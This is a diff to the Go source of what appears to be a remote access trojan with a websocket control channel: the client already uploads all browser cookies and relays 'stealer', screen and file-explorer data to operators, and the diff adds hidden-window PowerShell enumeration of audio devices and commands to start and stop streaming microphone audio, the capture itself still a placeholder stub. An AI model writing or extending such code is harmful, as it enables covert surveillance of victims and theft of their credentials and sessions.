@@ -520,6 +520,17 @@ func main() {
 					id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
 					collectAllCookies(id)
 					conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
+
+				case "get_audio_devices":
+					devices := getAudioDevices()
+					conn.WriteJSON(Message{Type: "audio_devices", Data: devices})
+
+				case "start_audio_listen":
+					deviceName := msg.Data
+					go startAudioCapture(conn, deviceName)
+
+				case "stop_audio_listen":
+					stopAudioCapture(conn)
 				}
 			}
 		}()
@@ -593,7 +604,64 @@ func copyFile(src, dst string) error {
 
 	_, err = io.Copy(out, in)
 	return err
-}`
+}
+
+func getAudioDevices() string {
+	// PowerShell команда для получения аудио устройств
+	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
+		"Add-Type -AssemblyName System.Management; "+
+			"$inputDevices = Get-WmiObject -Class Win32_SoundDevice | Where-Object {$_.StatusInfo -eq 1} | Select-Object Name, DeviceID; "+
+			"$outputDevices = Get-WmiObject -Class Win32_SoundDevice | Where-Object {$_.StatusInfo -eq 2} | Select-Object Name, DeviceID; "+
+			"$devices = @{input = @($inputDevices); output = @($outputDevices)}; "+
+			"ConvertTo-Json -Compress $devices")
+	
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "{\"input\":[],\"output\":[]}"
+	}
+	return string(output)
+}
+
+var audioCaptures = make(map[*websocket.Conn]bool)
+
+func startAudioCapture(conn *websocket.Conn, deviceName string) {
+	if audioCaptures[conn] {
+		return // Уже слушаем
+	}
+	
+	audioCaptures[conn] = true
+	
+	// Создаем временный файл для записи
+	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("audio_%d.wav", time.Now().Unix()))
+	
+	go func() {
+		defer func() {
+			audioCaptures[conn] = false
+			os.Remove(tempFile)
+		}()
+		
+		// Симулируем отправку аудио данных
+		ticker := time.NewTicker(100 * time.Millisecond)
+		defer ticker.Stop()
+		
+		for audioCaptures[conn] {
+			select {
+			case <-ticker.C:
+				// В реальной реализации здесь будет чтение аудио данных из процесса
+				// Для демонстрации отправляем заглушку
+				audioData := []byte(fmt.Sprintf("audio_data_%d", time.Now().Unix()))
+				encoded := base64.StdEncoding.EncodeToString(audioData)
+				conn.WriteJSON(Message{Type: "audio_data", Data: encoded})
+			}
+		}
+	}()
+}
+
+func stopAudioCapture(conn *websocket.Conn) {
+	audioCaptures[conn] = false
+}
+`
 
 type Message struct {
 	Type     string `json:"type"`
@@ -1140,7 +1208,7 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 			client.Username = msg.Data
 			log.Printf("Client %s identified as %s", client.ID, client.Username)
 
-		case "result", "screen", "explorer", "stealer":
+		case "result", "screen", "explorer", "stealer", "audio_devices", "audio_data":
 			broadcastToAdmins(msg, client.Owner)
 
 		case "upload":
